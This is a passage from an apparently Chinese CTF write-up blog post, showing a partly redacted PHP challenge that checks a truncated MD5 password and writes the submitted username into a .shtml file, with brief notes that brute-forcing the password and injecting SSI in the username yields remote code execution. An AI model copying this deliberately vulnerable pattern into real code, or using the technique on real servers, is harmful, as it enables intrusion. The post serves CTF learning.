    header(&quot;Content-Type: text/html;charset=utf-8&quot;);
    ***
    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] != &#39;&#39; )
    {
        $admin = &#39;6d0bc1&#39;;
        if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6)) {
            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&quot;;
            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;
            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);
            $text = &#39;
            ***
            ***
            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;/h1&gt;
            ***
            ***&#39;;
            fwrite($shtml,$text);
            fclose($shtml);
            ***
            echo &quot;[!] Header  error ...&quot;;
        } else {
            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&quot;;

    }else
    {
    ***
    }
    ***
?&gt;</code></pre>
<p>爆破得到密码,</p>
<p>因为将用户名插入到了shtml,造成ssi rce</p>
<p> <a href="https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/01/3月做题/">http://blog.ccreater.top/2020/04/01/3月做题/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/01/3%E6%9C%88%E5%81%9A%E9%A2%98/" data-id="cka3ckr1v0008v4v079fjgauh" data-title="3月做题" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&lt;- Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/">Next -&gt;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">比赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 10px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 16.67px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">域渗透</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">小工具</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">杂</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">比赛</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">靶场</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/06/30/tctf2020/">tctf2020</a>
          </li>
        
          <li>
            <a href="/2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/">拟态防御记录</a>
          </li>
        
          <li>
            <a href="/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/">2020第三届BJDCTF</a>
          </li>
        
          <li>
            <a href="/2020/05/20/bypass_csp/">bypass_csp</a>
          </li>
        
          <li>
            <a href="/2020/05/12/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/">2020年网鼎杯青龙组</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 ccreater<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":100},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
</html>